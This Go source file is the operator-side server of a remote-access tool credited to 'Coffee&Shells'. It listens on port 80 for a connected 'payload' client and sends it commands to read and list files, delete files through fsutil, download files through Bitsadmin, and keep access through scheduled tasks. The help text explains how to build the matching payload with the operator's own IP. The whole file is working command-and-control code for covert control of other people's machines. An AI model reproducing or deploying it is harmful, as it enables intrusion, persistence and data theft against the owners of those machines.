package main
import("fmt")
import("net")
import("bufio")
import("strings")
import("time")
func main () {
	fmt.Print("Waiting for client to connect...\n")
	file := "h-server-file"
	option := "h-server-options"
	connection, errer := net.Listen("tcp", ":80")
	if (errer != nil) {
		fmt.Print("Error, port is already in use\nit's possible something else failed\nexiting...")
		return
	}
	connectwo, errer := connection.Accept()
	if (errer != nil) {
		fmt.Print("\nError when accepting connection\nexiting...")
		return
	}
	fmt.Print("Connection made!\n")
	for {
		fmt.Print("\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\nOptions:\n0. Help\n1. Exit Server\n2. Exit Server And Client\n3. Read File\n4. List Files\n5. LOLBas module (Maintain access, file delete, file download, and traffic capture): ")
		fmt.Scanln(&option)
		if (option == "5") {
			fmt.Print("\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n0. Go back\n1. maintain access via schtasks\n2. Delete file via fsutil\n3. File download via Bitsadmin: ")
			choice := "02"
			fmt.Scanln(&choice)
			if (choice == "1") {
				fmt.Fprintf(connectwo, "5\n")
				fmt.Print("Command sent\nOutput:")
				out,_ := bufio.NewReader(connectwo).ReadString('\n')
				fmt.Print(out)
			}
			if (choice == "2") {
				fmt.Print("File to delete: ")
				choicer := "string"
				fmt.Scanln(&choicer)
				fmt.Fprintf(connectwo, "6\n")
				fmt.Fprintf(connectwo, choicer + "\n")
				fmt.Print("Command sent\nOutput:")
				out,_ := bufio.NewReader(connectwo).ReadString('\n')
				fmt.Print(out)
			}
			if (choice == "3") {
				fmt.Print("File URL: ")
				choicer := "string"
				fmt.Scanln(&choicer)
				filename := "string"
				time.Sleep(time.Second)
				fmt.Fprintf(connectwo, "7\n")
				time.Sleep(time.Second)
				fmt.Fprintf(connectwo, choicer + "\n")
				time.Sleep(time.Second)
				fmt.Fprintf(connectwo, filename + "\n")
				out,_ := bufio.NewReader(connectwo).ReadString('\n')
				time.Sleep(time.Second * 5)
				fmt.Print("Command sent\n",out)
			}
		}
		if (option == "0") {
			fmt.Print("Made by Coffee&Shells\nHow to make a client/payload: open the h.go file, change the IP to yours, if you change the port you'll also have to change the port on the server. Build the file, and you now have your payload.\nHow to fix most bugs: exit the server, the client will not exit, and re-open the server\n")
		}
		if (option == "1") {
			return
		}
		if (option == "2") {
			fmt.Fprintf(connectwo, "3\n")
			fmt.Print("Run server again to make sure client has exited")
			return
		}
		if (option == "4") {
			fmt.Fprintf(connectwo, "4\n")
			fmt.Print("Dir to read: ")
			aaa := "/"
			fmt.Scanln(&aaa)
			fmt.Fprintf(connectwo, aaa + "\n")
			for {
				stuff2, err := bufio.NewReader(connectwo).ReadString('\n')
				if (err != nil) {
					fmt.Print("Error, client possibly killed")
					break
				}
				if (stuff2 == "EOF" || stuff2 == "EOF\n") {
					break
				}
				if (stuff2 == "ERROR" || stuff2 == "ERROR\n") {
					fmt.Print("Dir not found, probably\n")
					break
				}
				fmt.Print(stuff2)
			}
		}
		if (option == "3") {
			fmt.Fprintf(connectwo, "1\n")
			fmt.Print("File to read: ")
			fmt.Scanln(&file)
			fmt.Fprintf(connectwo, file + "\n")
			for {
				stuff, er := bufio.NewReader(connectwo).ReadString('\n')
				stuff2 := strings.Replace(stuff, "ඞ", "\n", -1)
				fmt.Print(stuff2)
				if (er != nil) {
					fmt.Print("Error\nbreaking...")
					break
				}
				if (stuff == "ERROR\n") {
					fmt.Print("Error, file not found (probably)")
					break
				}
				break
			}
		}
	}
}
